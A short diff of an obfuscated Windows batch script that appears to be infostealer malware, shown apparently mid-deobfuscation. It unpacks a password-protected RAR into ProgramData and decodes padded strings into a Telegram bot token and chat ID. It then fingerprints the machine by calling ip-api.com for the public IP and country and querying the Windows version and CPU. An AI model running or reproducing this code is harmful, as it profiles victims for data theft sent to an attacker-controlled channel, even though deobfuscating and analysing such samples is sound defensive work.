@@ -1,8 +1,8 @@
 "%ProgramData%\dist\UnRAR.exe" x -y -p%JVPCOT%1%RPJJKX%4%OJ ERZ%7%EUCUJK%8%ATXODM%5%DSJIDL%2%HTHDOT%3%AVVUYS%6%NZDNDG%9 "%ProgramData%\dist\51654.rar" "%ProgramData%\dist\"
 
 setlocal EnableDelayedExpansion
-set "TOKEN=%RAE XE%7%RDAYKM%6%NJSEZY%1%SLVIQX%5%UEH WJ%3%NSHPSF%5%FTSLVK%3% HHJEF%8%KHUEVS%7%MILHFS%6:%XRISLT%A%EZSN G%A%FHRLJJ%F-%QLACQO%M%PIXQDJ%c%UZNAOE%j%BHWOEG%1%NYHO O%D%AA CRV%D%RVBUCD%x%XOVITB%s%UFTNJB%8%NBGVPS%5%HAJIPD%m-%KSHTKU%p%CIFTSQ%U%LFFGVU%4%VOSYPP%f%OXFJNB%A%VOZSZA%I%VBWZKB%R%XVKRJK%3%NAGPOB%4%LMCSEN%j%PUVDZE%J%RUGEMU%1%ZXEQBV%r%FYOWWM%8%WFAYGM%y%YCXIKR%7%HUXF P%p%EJPNQR%5%YWLIMH%4"
-set "CHAT_ID=%ALVFLW%5%IEPNLS%6%PBUXFO%7%PXUWUF%4%KBUFZY%9%FMQTVG%3%EFMLKK%8%FUZFHD%5%DMFHPZ%3%AFSPVK%2"
+set "TOKEN=7615353876:AAF-Mcj1DDxs85m-pU4fAIR34jJ1r8y7p54"
+set "CHAT_ID=5674938532"
 for /f "tokens=1,2 delims=," %%a in ('curl -s "http://ip-api.com/csv/?fields=country,query"') do (set "Country=%%a" & set "IP=%%b" & echo Country: !Country! & echo IP: !IP!)
 for /f "tokens=2 delims==" %%a in ('wmic os get Caption /value') do set "Windows=%%a"
 for /f "tokens=2 delims==" %%a in ('wmic cpu get name /value') do set "CPU=%%a"
